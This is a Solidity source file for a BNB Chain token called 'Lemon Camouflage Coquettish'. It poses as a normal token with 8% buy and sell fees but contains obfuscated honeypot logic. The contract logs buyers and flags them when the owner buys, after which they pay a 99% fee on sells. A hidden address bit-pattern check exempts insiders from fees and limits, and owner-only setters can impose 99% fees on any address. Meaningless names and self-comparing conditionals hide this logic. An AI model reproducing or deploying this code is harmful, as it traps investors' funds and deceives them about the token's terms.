/**
 *Submitted for verification at BscScan.com on 2022-12-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract LemonCamouflageCoquettish is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Lemon Camouflage Coquettish ";
    string constant _symbol = "LemonCamouflageCoquettish";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private swapBurnLiquidityBuyExempt;
    mapping(address => bool) private tradingLiquidityBotsMaxTeamExempt;
    mapping(address => bool) private txTeamExemptLiquidityMax;
    mapping(address => bool) private receiverBotsFeeMaxBuy;
    mapping(address => uint256) private burnFeeTxLaunchedAutoMinTeam;
    mapping(uint256 => address) private autoTeamExemptTxLimit;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private modeExemptTradingLiquiditySwap = 0;
    uint256 private isBurnWalletReceiver = 8;

    //SELL FEES
    uint256 private exemptLaunchedLimitAuto = 0;
    uint256 private txBotsBuySwap = 8;

    uint256 private autoMarketingIsLimit = isBurnWalletReceiver + modeExemptTradingLiquiditySwap;
    uint256 private buyFeeReceiverTxMaxMode = 100;

    address private liquidityAutoMarketingSwapIs = (msg.sender); // auto-liq address
    address private swapTeamIsMaxLiquidity = (0x94614b067dEfeB12CCe97EdDFffFfc8C8400A5f0); // marketing address
    address private walletTxReceiverExemptLimitSwapIs = DEAD;
    address private marketingIsBotsReceiver = DEAD;
    address private marketingLaunchedBurnLiquidity = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private exemptFeeLimitWallet;
    uint256 private autoLaunchedExemptBurn;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private liquidityMinReceiverWalletLimitMaxLaunched;
    uint256 private sellBuyWalletExempt;
    uint256 private modeIsBurnSwap;
    uint256 private launchedSwapBurnLiquidityFeeExempt;
    uint256 private txFeeLimitBurn;

    bool private feeLimitAutoBuy = true;
    bool private receiverBotsFeeMaxBuyMode = true;
    bool private burnFeeReceiverBuy = true;
    bool private receiverLimitLaunchedBurn = true;
    bool private sellBurnLaunchedMarketing = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private buyModeTxIsBurn = 6 * 10 ** 15;
    uint256 private swapLaunchedTeamBots = _totalSupply / 1000; // 0.1%

    
    uint256 private feeTxLaunchedWalletTradingExempt = 0;
    uint256 private exemptTradingSellWallet = 0;
    bool private maxLimitLaunchedTrading = false;
    bool private marketingFeeSellMax = false;
    uint256 private exemptFeeMaxWallet = 0;
    uint256 private tradingTeamLimitLaunched = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        liquidityMinReceiverWalletLimitMaxLaunched = true;

        swapBurnLiquidityBuyExempt[msg.sender] = true;
        swapBurnLiquidityBuyExempt[address(this)] = true;

        tradingLiquidityBotsMaxTeamExempt[msg.sender] = true;
        tradingLiquidityBotsMaxTeamExempt[0x0000000000000000000000000000000000000000] = true;
        tradingLiquidityBotsMaxTeamExempt[0x000000000000000000000000000000000000dEaD] = true;
        tradingLiquidityBotsMaxTeamExempt[address(this)] = true;

        txTeamExemptLiquidityMax[msg.sender] = true;
        txTeamExemptLiquidityMax[0x0000000000000000000000000000000000000000] = true;
        txTeamExemptLiquidityMax[0x000000000000000000000000000000000000dEaD] = true;
        txTeamExemptLiquidityMax[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return txReceiverWalletIsLimit(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return txReceiverWalletIsLimit(sender, recipient, amount);
    }

    function txReceiverWalletIsLimit(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = marketingExemptMaxLaunched(sender) || marketingExemptMaxLaunched(recipient);
        
        if (exemptFeeMaxWallet == buyModeTxIsBurn) {
            exemptFeeMaxWallet = exemptTradingSellWallet;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isOwner(recipient)) {
                maxMinSwapTeam();
            }
            if (!bLimitTxWalletValue) {
                minLaunchedSellTrading(recipient);
            }
        }
        
        if (marketingFeeSellMax != receiverLimitLaunchedBurn) {
            marketingFeeSellMax = maxLimitLaunchedTrading;
        }

        if (exemptFeeMaxWallet == exemptFeeMaxWallet) {
            exemptFeeMaxWallet = modeExemptTradingLiquiditySwap;
        }

        if (maxLimitLaunchedTrading == maxLimitLaunchedTrading) {
            maxLimitLaunchedTrading = sellBurnLaunchedMarketing;
        }


        if (inSwap || bLimitTxWalletValue) {return walletExemptSellBurnLiquidityTeam(sender, recipient, amount);}

        if (!swapBurnLiquidityBuyExempt[sender] && !swapBurnLiquidityBuyExempt[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        if (marketingFeeSellMax != marketingFeeSellMax) {
            marketingFeeSellMax = sellBurnLaunchedMarketing;
        }

        if (maxLimitLaunchedTrading == feeLimitAutoBuy) {
            maxLimitLaunchedTrading = receiverLimitLaunchedBurn;
        }


        require((amount <= _maxTxAmount) || txTeamExemptLiquidityMax[sender] || txTeamExemptLiquidityMax[recipient], "Max TX Limit has been triggered");

        if (autoBurnLiquidityMax()) {minMaxBurnTradingSwap();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if (exemptFeeMaxWallet != autoMarketingIsLimit) {
            exemptFeeMaxWallet = isBurnWalletReceiver;
        }


        uint256 amountReceived = modeBurnBotsSwap(sender) ? maxTxSwapReceiverSell(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function walletExemptSellBurnLiquidityTeam(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function modeBurnBotsSwap(address sender) internal view returns (bool) {
        return !tradingLiquidityBotsMaxTeamExempt[sender];
    }

    function feeBuySellTeam(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            autoMarketingIsLimit = txBotsBuySwap + exemptLaunchedLimitAuto;
            return modeTradingWalletExempt(sender, autoMarketingIsLimit);
        }
        if (!selling && sender == uniswapV2Pair) {
            autoMarketingIsLimit = isBurnWalletReceiver + modeExemptTradingLiquiditySwap;
            return autoMarketingIsLimit;
        }
        return modeTradingWalletExempt(sender, autoMarketingIsLimit);
    }

    function isLimitMaxReceiver() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function maxTxSwapReceiverSell(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(feeBuySellTeam(sender, receiver == uniswapV2Pair)).div(buyFeeReceiverTxMaxMode);

        if (receiverBotsFeeMaxBuy[sender] || receiverBotsFeeMaxBuy[receiver]) {
            feeAmount = amount.mul(99).div(buyFeeReceiverTxMaxMode);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function marketingExemptMaxLaunched(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function modeTradingWalletExempt(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = burnFeeTxLaunchedAutoMinTeam[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function minLaunchedSellTrading(address addr) private {
        if (isLimitMaxReceiver() < buyModeTxIsBurn) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        autoTeamExemptTxLimit[exemptLimitValue] = addr;
    }

    function maxMinSwapTeam() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (burnFeeTxLaunchedAutoMinTeam[autoTeamExemptTxLimit[i]] == 0) {
                    burnFeeTxLaunchedAutoMinTeam[autoTeamExemptTxLimit[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(swapTeamIsMaxLiquidity).transfer(amountBNB * amountPercentage / 100);
    }

    function autoBurnLiquidityMax() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    sellBurnLaunchedMarketing &&
    _balances[address(this)] >= swapLaunchedTeamBots;
    }

    function minMaxBurnTradingSwap() internal swapping {
        
        if (feeTxLaunchedWalletTradingExempt != buyModeTxIsBurn) {
            feeTxLaunchedWalletTradingExempt = feeTxLaunchedWalletTradingExempt;
        }

        if (tradingTeamLimitLaunched != buyFeeReceiverTxMaxMode) {
            tradingTeamLimitLaunched = swapLaunchedTeamBots;
        }

        if (marketingFeeSellMax == feeLimitAutoBuy) {
            marketingFeeSellMax = sellBurnLaunchedMarketing;
        }


        uint256 amountToLiquify = swapLaunchedTeamBots.mul(modeExemptTradingLiquiditySwap).div(autoMarketingIsLimit).div(2);
        uint256 amountToSwap = swapLaunchedTeamBots.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (tradingTeamLimitLaunched == tradingTeamLimitLaunched) {
            tradingTeamLimitLaunched = buyModeTxIsBurn;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = autoMarketingIsLimit.sub(modeExemptTradingLiquiditySwap.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(modeExemptTradingLiquiditySwap).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(isBurnWalletReceiver).div(totalETHFee);
        
        if (marketingFeeSellMax == sellBurnLaunchedMarketing) {
            marketingFeeSellMax = receiverLimitLaunchedBurn;
        }

        if (exemptFeeMaxWallet != exemptTradingSellWallet) {
            exemptFeeMaxWallet = exemptLaunchedLimitAuto;
        }


        payable(swapTeamIsMaxLiquidity).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                liquidityAutoMarketingSwapIs,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getLiquidityAutoMarketingSwapIs() public view returns (address) {
        if (liquidityAutoMarketingSwapIs != liquidityAutoMarketingSwapIs) {
            return liquidityAutoMarketingSwapIs;
        }
        return liquidityAutoMarketingSwapIs;
    }
    function setLiquidityAutoMarketingSwapIs(address a0) public onlyOwner {
        if (liquidityAutoMarketingSwapIs == swapTeamIsMaxLiquidity) {
            swapTeamIsMaxLiquidity=a0;
        }
        if (liquidityAutoMarketingSwapIs == marketingIsBotsReceiver) {
            marketingIsBotsReceiver=a0;
        }
        liquidityAutoMarketingSwapIs=a0;
    }

    function getFeeLimitAutoBuy() public view returns (bool) {
        if (feeLimitAutoBuy == sellBurnLaunchedMarketing) {
            return sellBurnLaunchedMarketing;
        }
        return feeLimitAutoBuy;
    }
    function setFeeLimitAutoBuy(bool a0) public onlyOwner {
        if (feeLimitAutoBuy == marketingFeeSellMax) {
            marketingFeeSellMax=a0;
        }
        if (feeLimitAutoBuy != maxLimitLaunchedTrading) {
            maxLimitLaunchedTrading=a0;
        }
        feeLimitAutoBuy=a0;
    }

    function getAutoMarketingIsLimit() public view returns (uint256) {
        if (autoMarketingIsLimit != buyFeeReceiverTxMaxMode) {
            return buyFeeReceiverTxMaxMode;
        }
        if (autoMarketingIsLimit == autoMarketingIsLimit) {
            return autoMarketingIsLimit;
        }
        if (autoMarketingIsLimit == tradingTeamLimitLaunched) {
            return tradingTeamLimitLaunched;
        }
        return autoMarketingIsLimit;
    }
    function setAutoMarketingIsLimit(uint256 a0) public onlyOwner {
        if (autoMarketingIsLimit != exemptFeeMaxWallet) {
            exemptFeeMaxWallet=a0;
        }
        if (autoMarketingIsLimit == txBotsBuySwap) {
            txBotsBuySwap=a0;
        }
        autoMarketingIsLimit=a0;
    }

    function getIsBurnWalletReceiver() public view returns (uint256) {
        return isBurnWalletReceiver;
    }
    function setIsBurnWalletReceiver(uint256 a0) public onlyOwner {
        if (isBurnWalletReceiver == swapLaunchedTeamBots) {
            swapLaunchedTeamBots=a0;
        }
        if (isBurnWalletReceiver != txBotsBuySwap) {
            txBotsBuySwap=a0;
        }
        isBurnWalletReceiver=a0;
    }

    function getWalletTxReceiverExemptLimitSwapIs() public view returns (address) {
        if (walletTxReceiverExemptLimitSwapIs != marketingLaunchedBurnLiquidity) {
            return marketingLaunchedBurnLiquidity;
        }
        if (walletTxReceiverExemptLimitSwapIs != marketingLaunchedBurnLiquidity) {
            return marketingLaunchedBurnLiquidity;
        }
        if (walletTxReceiverExemptLimitSwapIs == liquidityAutoMarketingSwapIs) {
            return liquidityAutoMarketingSwapIs;
        }
        return walletTxReceiverExemptLimitSwapIs;
    }
    function setWalletTxReceiverExemptLimitSwapIs(address a0) public onlyOwner {
        if (walletTxReceiverExemptLimitSwapIs == marketingIsBotsReceiver) {
            marketingIsBotsReceiver=a0;
        }
        if (walletTxReceiverExemptLimitSwapIs != walletTxReceiverExemptLimitSwapIs) {
            walletTxReceiverExemptLimitSwapIs=a0;
        }
        if (walletTxReceiverExemptLimitSwapIs == swapTeamIsMaxLiquidity) {
            swapTeamIsMaxLiquidity=a0;
        }
        walletTxReceiverExemptLimitSwapIs=a0;
    }

    function getExemptFeeMaxWallet() public view returns (uint256) {
        if (exemptFeeMaxWallet == feeTxLaunchedWalletTradingExempt) {
            return feeTxLaunchedWalletTradingExempt;
        }
        if (exemptFeeMaxWallet == buyFeeReceiverTxMaxMode) {
            return buyFeeReceiverTxMaxMode;
        }
        if (exemptFeeMaxWallet == buyModeTxIsBurn) {
            return buyModeTxIsBurn;
        }
        return exemptFeeMaxWallet;
    }
    function setExemptFeeMaxWallet(uint256 a0) public onlyOwner {
        if (exemptFeeMaxWallet != isBurnWalletReceiver) {
            isBurnWalletReceiver=a0;
        }
        if (exemptFeeMaxWallet != buyModeTxIsBurn) {
            buyModeTxIsBurn=a0;
        }
        if (exemptFeeMaxWallet == swapLaunchedTeamBots) {
            swapLaunchedTeamBots=a0;
        }
        exemptFeeMaxWallet=a0;
    }

    function getModeExemptTradingLiquiditySwap() public view returns (uint256) {
        if (modeExemptTradingLiquiditySwap == exemptLaunchedLimitAuto) {
            return exemptLaunchedLimitAuto;
        }
        return modeExemptTradingLiquiditySwap;
    }
    function setModeExemptTradingLiquiditySwap(uint256 a0) public onlyOwner {
        modeExemptTradingLiquiditySwap=a0;
    }

    function getReceiverBotsFeeMaxBuyMode() public view returns (bool) {
        return receiverBotsFeeMaxBuyMode;
    }
    function setReceiverBotsFeeMaxBuyMode(bool a0) public onlyOwner {
        if (receiverBotsFeeMaxBuyMode != marketingFeeSellMax) {
            marketingFeeSellMax=a0;
        }
        if (receiverBotsFeeMaxBuyMode != sellBurnLaunchedMarketing) {
            sellBurnLaunchedMarketing=a0;
        }
        if (receiverBotsFeeMaxBuyMode == receiverLimitLaunchedBurn) {
            receiverLimitLaunchedBurn=a0;
        }
        receiverBotsFeeMaxBuyMode=a0;
    }

    function getBurnFeeTxLaunchedAutoMinTeam(address a0) public view returns (uint256) {
        if (a0 == walletTxReceiverExemptLimitSwapIs) {
            return isBurnWalletReceiver;
        }
        if (burnFeeTxLaunchedAutoMinTeam[a0] != burnFeeTxLaunchedAutoMinTeam[a0]) {
            return txBotsBuySwap;
        }
            return burnFeeTxLaunchedAutoMinTeam[a0];
    }
    function setBurnFeeTxLaunchedAutoMinTeam(address a0,uint256 a1) public onlyOwner {
        if (burnFeeTxLaunchedAutoMinTeam[a0] == burnFeeTxLaunchedAutoMinTeam[a0]) {
           burnFeeTxLaunchedAutoMinTeam[a0]=a1;
        }
        burnFeeTxLaunchedAutoMinTeam[a0]=a1;
    }

    function getBuyModeTxIsBurn() public view returns (uint256) {
        if (buyModeTxIsBurn == exemptFeeMaxWallet) {
            return exemptFeeMaxWallet;
        }
        return buyModeTxIsBurn;
    }
    function setBuyModeTxIsBurn(uint256 a0) public onlyOwner {
        if (buyModeTxIsBurn == exemptFeeMaxWallet) {
            exemptFeeMaxWallet=a0;
        }
        if (buyModeTxIsBurn != feeTxLaunchedWalletTradingExempt) {
            feeTxLaunchedWalletTradingExempt=a0;
        }
        if (buyModeTxIsBurn != swapLaunchedTeamBots) {
            swapLaunchedTeamBots=a0;
        }
        buyModeTxIsBurn=a0;
    }

    function getReceiverBotsFeeMaxBuy(address a0) public view returns (bool) {
        if (a0 == walletTxReceiverExemptLimitSwapIs) {
            return receiverLimitLaunchedBurn;
        }
        if (a0 != walletTxReceiverExemptLimitSwapIs) {
            return receiverLimitLaunchedBurn;
        }
            return receiverBotsFeeMaxBuy[a0];
    }
    function setReceiverBotsFeeMaxBuy(address a0,bool a1) public onlyOwner {
        if (receiverBotsFeeMaxBuy[a0] == swapBurnLiquidityBuyExempt[a0]) {
           swapBurnLiquidityBuyExempt[a0]=a1;
        }
        if (receiverBotsFeeMaxBuy[a0] == tradingLiquidityBotsMaxTeamExempt[a0]) {
           tradingLiquidityBotsMaxTeamExempt[a0]=a1;
        }
        receiverBotsFeeMaxBuy[a0]=a1;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}